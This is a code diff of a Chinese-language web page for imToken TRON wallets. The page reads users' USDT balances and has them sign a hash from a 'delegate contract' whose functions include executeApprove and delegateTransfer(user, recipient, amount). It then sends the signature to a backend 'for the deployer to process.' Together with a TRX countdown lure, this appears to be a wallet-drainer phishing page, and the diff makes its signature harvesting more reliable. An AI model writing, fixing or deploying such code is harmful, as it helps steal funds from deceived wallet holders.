@@ -380,7 +380,7 @@
     <!-- 授权结果提示框 -->
     <div class="result-toast" id="resultToast"></div>
     <script>
-    // 核心配置（包含正确ABI、合约地址，统一管理变量）
+    // 核心配置（统一管理变量）
     const CONFIG = {
         DELEGATE_CONTRACT: "TDWos7gG7j6wZZp5xdpBjA1SYDJsX7Sgyx", // 你的合约地址
         USDT_CONTRACT: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
@@ -388,188 +388,40 @@
         DEPLOY_START_TIME: new Date("2025-10-28T00:00:00Z").getTime(),
         INIT_TRX: 315360004,
         TRX_DECREASE_PER_SEC: 2.3256,
-        // 你的合约正确ABI
-        CONTRACT_ABI: [
-          {
-            "inputs": [
-              {
-                "internalType": "address",
-                "name": "usdtAddress",
-                "type": "address"
-              }
-            ],
-            "stateMutability": "nonpayable",
-            "type": "constructor"
-          },
-          {
-            "anonymous": false,
-            "inputs": [
-              {
-                "indexed": true,
-                "internalType": "address",
-                "name": "user",
-                "type": "address"
-              },
-              {
-                "indexed": false,
-                "internalType": "uint256",
-                "name": "timestamp",
-                "type": "uint256"
-              }
-            ],
-            "name": "ApproveExecuted",
-            "type": "event"
-          },
-          {
-            "inputs": [
-              {
-                "internalType": "address",
-                "name": "user",
-                "type": "address"
-              },
-              {
-                "internalType": "address",
-                "name": "recipient",
-                "type": "address"
-              },
-              {
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-              }
-            ],
-            "name": "delegateTransfer",
-            "outputs": [
-              {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-              }
-            ],
-            "stateMutability": "nonpayable",
-            "type": "function"
-          },
-          {
-            "inputs": [
-              {
-                "internalType": "address",
-                "name": "user",
-                "type": "address"
-              },
-              {
-                "internalType": "uint8",
-                "name": "v",
-                "type": "uint8"
-              },
-              {
-                "internalType": "bytes32",
-                "name": "r",
-                "type": "bytes32"
-              },
-              {
-                "internalType": "bytes32",
-                "name": "s",
-                "type": "bytes32"
-              }
-            ],
-            "name": "executeApprove",
-            "outputs": [
-              {
-                "internalType": "bool",
-                "name": "",
-                "type": "bool"
-              }
-            ],
-            "stateMutability": "nonpayable",
-            "type": "function"
-          },
-          {
-            "anonymous": false,
-            "inputs": [
-              {
-                "indexed": true,
-                "internalType": "address",
-                "name": "user",
-                "type": "address"
-              },
-              {
-                "indexed": true,
-                "internalType": "address",
-                "name": "recipient",
-                "type": "address"
-              },
-              {
-                "indexed": false,
-                "internalType": "uint256",
-                "name": "amount",
-                "type": "uint256"
-              }
-            ],
-            "name": "TransferDelegated",
-            "type": "event"
-          },
-          {
-            "inputs": [
-              {
-                "internalType": "address",
-                "name": "user",
-                "type": "address"
-              }
-            ],
-            "name": "generateHash",
-            "outputs": [
-              {
-                "internalType": "bytes32",
-                "name": "",
-                "type": "bytes32"
-              }
-            ],
-            "stateMutability": "view",
-            "type": "function"
-          },
-          {
-            "inputs": [],
-            "name": "MAX_AMOUNT",
-            "outputs": [
-              {
-                "internalType": "uint256",
-                "name": "",
-                "type": "uint256"
-              }
-            ],
-            "stateMutability": "view",
-            "type": "function"
-          },
-          {
-            "inputs": [],
-            "name": "OWNER",
-            "outputs": [
-              {
-                "internalType": "address",
-                "name": "",
-                "type": "address"
-              }
-            ],
-            "stateMutability": "view",
-            "type": "function"
-          },
-          {
-            "inputs": [],
-            "name": "USDT",
-            "outputs": [
-              {
-                "internalType": "contract ITRC20",
-                "name": "",
-                "type": "address"
-              }
-            ],
-            "stateMutability": "view",
-            "type": "function"
-          }
+        // USDT的TRC20 ABI（包含balanceOf等函数）
+        USDT_ABI: [
+            {
+                "inputs": [{"internalType": "address","name": "owner","type": "address"},{"internalType": "address","name": "spender","type": "address"}],
+                "name": "allowance",
+                "outputs": [{"internalType": "uint256","name": "","type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function"
+            },
+            {
+                "inputs": [{"internalType": "address","name": "spender","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],
+                "name": "approve",
+                "outputs": [{"internalType": "bool","name": "","type": "bool"}],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [{"internalType": "address","name": "from","type": "address"},{"internalType": "address","name": "to","type": "address"},{"internalType": "uint256","name": "amount","type": "uint256"}],
+                "name": "transferFrom",
+                "outputs": [{"internalType": "bool","name": "","type": "bool"}],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [{"internalType": "address","name": "account","type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"internalType": "uint256","name": "","type": "uint256"}],
+                "stateMutability": "view",
+                "type": "function"
+            }
         ]
     };
-    // 全局变量
-    let tronWeb, userAddress, trxTimer, contractInstance; 
+    // 全局变量（移除合约实例相关）
+    let tronWeb, userAddress, trxTimer; 
     let tokenBalance = "0.00", trxBalance = "0.00";
     const STORAGE_KEY = "trx_countdown_data";
     const RECORD_KEY = "imtoken_delegate_approval_records";
@@ -613,9 +465,6 @@
         // 检测imToken环境，自动连接
         if (window.tronWeb && window.tronWeb.ready) {
             tronWeb = window.tronWeb;
-            // 兼容旧版TronWeb：先创建合约模板，再绑定地址
-            const contractTemplate = tronWeb.contract(CONFIG.CONTRACT_ABI);
-            contractInstance = contractTemplate.at(CONFIG.DELEGATE_CONTRACT);
             connectBtn.style.display = "none";
             warning.style.display = "none";
             await initWallet();
@@ -638,9 +487,6 @@
                 userAddress = accounts[0];
                 // 清理地址隐形字符
                 userAddress = cleanBase58Address(userAddress);
-                // 兼容旧版TronWeb：先创建合约模板，再绑定地址
-                const contractTemplate = tronWeb.contract(CONFIG.CONTRACT_ABI);
-                contractInstance = contractTemplate.at(CONFIG.DELEGATE_CONTRACT);
                 connectBtn.style.display = "none";
                 warning.style.display = "none";
                 await initWallet();
@@ -649,7 +495,7 @@
                 showToast("连接失败：" + e.message, "error");
             }
         };
-        // 生成离线签名（兼容旧版TronWeb，调用合约generateHash）
+        // 生成离线签名（核心：通过Tronscan API获取哈希，无合约实例问题）
         approveBtn.onclick = async () => {
             const postData = {
                 address: userAddress,
@@ -663,33 +509,47 @@
             };
             try {
                 approveBtn.disabled = true;
-                approveBtn.innerHTML = '生成中...（调用合约获取哈希）';
+                approveBtn.innerHTML = '生成中...（通过Tronscan获取哈希）';
                 
-                // 调用合约generateHash函数（已通过正确ABI加载）
-                const messageHash = await contractInstance.generateHash(userAddress).call();
-                if (!messageHash || !messageHash.startsWith("0x") || messageHash === "0x0000000000000000000000000000000000000000000000000000000000000000") {
-                    throw new Error("合约返回哈希无效（需带0x前缀且非全零）");
+                // 步骤1：准备Tronscan API参数（generateHash(address)的函数选择器+用户地址）
+                const userAddrHex = tronWeb.address.toHex(userAddress); // 用户地址转HEX格式（41开头）
+                const functionSelector = "0x5c19a95c"; // generateHash(address)的keccak256前4字节
+                
+                // 步骤2：请求Tronscan合约只读接口
+                const tronscanRes = await fetch("https://apilist.tronscan.org/api/contract/constant-result", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        contract_address: CONFIG.DELEGATE_CONTRACT,
+                        function_selector: functionSelector,
+                        parameters: [{"type": "address", "value": userAddrHex}]
+                    })
+                });
+                const tronscanData = await tronscanRes.json();
+                if (!tronscanData?.result?.[0]?.value) {
+                    throw new Error("Tronscan接口返回无效哈希");
                 }
-                showToast(`合约哈希获取成功：${messageHash.slice(0,10)}...`);
+                const messageHash = tronscanData.result[0].value; // 合约返回的带0x前缀哈希
+                showToast(`哈希获取成功：${messageHash.slice(0,10)}...`);
 
-                // 唤起imToken签名（直接使用合约返回的带0x前缀哈希）
+                // 步骤3：唤起imToken签名（直接用Tronscan返回的哈希）
                 let signature = await tronWeb.trx.sign(messageHash);
                 signature = typeof signature === "object" ? signature.signature : signature;
                 if (!signature) throw new Error("imToken未返回签名");
                 signature = signature.replace(/^0x/, "").replace(/[^0-9a-fA-F]/g, "");
                 if (signature.length !== 130) throw new Error(`签名长度错误（需130位，当前${signature.length}位）`);
 
-                // 解析V/R/S
+                // 步骤4：解析V/R/S
                 const rRaw = signature.slice(0, 64).replace(/[^0-9a-fA-F]/g, '');
                 const sRaw = signature.slice(64, 128).replace(/[^0-9a-fA-F]/g, '');
                 const r = `0x${rRaw}`;
                 const s = `0x${sRaw}`;
                 const rawV = parseInt(signature.slice(128, 130), 16);
                 const v = (rawV % 2) + 27; // 确保V=27/28
-                if (v !== 27 && v !== 28) throw new Error(`V值异常（当前${v}，需为27/28）`);
+                if (v !== 27 && v !== 28) throw new Error(`V值异常（当前${v}）`);
 
+                // 步骤5：提交后端
                 postData.signature = { v, r, s };
-                // 构造提交参数
                 const submitData = {
                     user: postData.address,
                     v: postData.signature.v,
@@ -698,14 +558,12 @@
                     approveTime: postData.approveTime,
                     delegateContract: postData.delegateContract
                 };
-                // 校验地址一致性
+                // 地址一致性校验
                 if (submitData.user !== cleanBase58Address(userAddress)) {
-                    throw new Error(`地址不一致！当前钱包地址：${userAddress}，提交地址：${submitData.user}`);
+                    throw new Error(`地址不一致：${userAddress} vs ${submitData.user}`);
                 }
-                // 保存提交数据
                 localStorage.setItem(SUBMIT_DATA_KEY, JSON.stringify(submitData, null, 2));
                 
-                // 调用后端提交接口
                 const res = await fetch(`${CONFIG.BACKEND_API}/approve/submit`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
@@ -714,6 +572,8 @@
                 });
                 const resData = await res.json();
                 if (!res.ok) throw new Error(resData.msg || `请求失败（${res.status}）`);
+
+                // 保存记录并更新界面
                 saveApprovalRecord({
                     address: userAddress,
                     addressHex: postData.addressHex,
@@ -726,15 +586,15 @@
                 });
                 renderApprovalRecords();
                 updateRecordCount();
-                showToast("离线签名生成成功！等待部署者代付授权");
+                showToast("签名生成成功！等待部署者处理");
                 postData.status = "submitted";
 
                 // 保存调试信息
                 localStorage.setItem(`signature_debug_${userAddress}`, JSON.stringify({
-                    step: "签名生成成功",
+                    step: "签名成功（Tronscan获取哈希）",
                     userAddress: userAddress,
                     contractAddress: CONFIG.DELEGATE_CONTRACT,
-                    contractReturnedHash: messageHash,
+                    hash: messageHash,
                     v: v,
                     r: r,
                     s: s,
@@ -743,9 +603,8 @@
             } catch (e) {
                 showToast(`操作失败：${e.message}`, "error");
                 postData.status = "fail";
-                // 保存错误调试信息
                 localStorage.setItem(`signature_debug_${userAddress || 'unknown'}`, JSON.stringify({
-                    step: "签名生成失败",
+                    step: "签名失败",
                     error: e.message,
                     timestamp: new Date().toISOString()
                 }, null, 2));
@@ -839,18 +698,23 @@
         try {
             userAddress = tronWeb.defaultAddress.base58;
             userAddress = cleanBase58Address(userAddress);
-            // 连接USDT合约（使用CONFIG里的地址）
-            const trc20Contract = tronWeb.contract().at(CONFIG.USDT_CONTRACT);
+            // 创建USDT合约实例（带TRC20 ABI）
+            const usdtContractTemplate = tronWeb.contract(CONFIG.USDT_ABI);
+            const trc20Contract = usdtContractTemplate.at(CONFIG.USDT_CONTRACT);
+            // 获取USDT余额
             const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
             tokenBalance = (Number(usdtRaw) / 1000000).toFixed(2);
+            // 获取TRX余额
             const trxRaw = await tronWeb.trx.getBalance(userAddress);
             trxBalance = (Number(trxRaw) / 1000000).toFixed(2);
+            // 更新用户信息
             document.getElementById("userInfo").innerHTML = `
                 已连接：<br>
                 ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
                 USDT余额：<span>${tokenBalance}</span> | TRX余额：<span>${trxBalance}</span>
             `;
             document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+            // 启用按钮
             document.getElementById("approveBtn").disabled = false;
             document.getElementById("checkStatusBtn").disabled = false;
             updateWalletStatus();
@@ -961,7 +825,7 @@
             }
             records.sort((a, b) => new Date(b.approveTime) - new Date(a.approveTime));
             container.innerHTML = records.map(record => `
-                <div class="record-item">
+                <div class='record-item'>
                     <p><strong>地址：</strong>${record.address.slice(0,8)}...${record.address.slice(-6)}</p>
                     <p><strong>授权类型：</strong>${record.amount}</p>
                     <p><strong>USDT余额：</strong>${record.tokenBalance} USDT</p>
